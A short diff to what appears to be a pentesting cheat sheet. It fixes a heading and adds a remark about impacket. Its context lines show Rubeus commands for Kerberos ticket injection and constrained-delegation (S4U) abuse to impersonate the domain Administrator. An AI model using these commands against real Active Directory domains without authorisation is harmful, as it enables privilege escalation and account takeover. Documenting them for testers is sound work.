@@ -302,7 +302,7 @@ then inject the tgt:
 .\Rubeus.exe ptt /ticket:<ticket>
 ```
   
-#Contrained delegation
+# Contrained delegation
 asktgt with the server/user with contrained delegation:
 ```
 .\Rubeus.exe asktgt /domain:<domain> /user:<user> /rc4:<user> /ptt
@@ -311,6 +311,7 @@ asktgs with previous tgt and impersonate domain admin:
 ```
 .\Rubeus.exe s4u /domain:<domain> /impersonateuser:Administrator /msdsspn:"<service>" /ticket:<TGT> /ptt
 ```
+ps: then same can be done with impacket script
 --------------------------------------------------------------
 
 # Check LIST
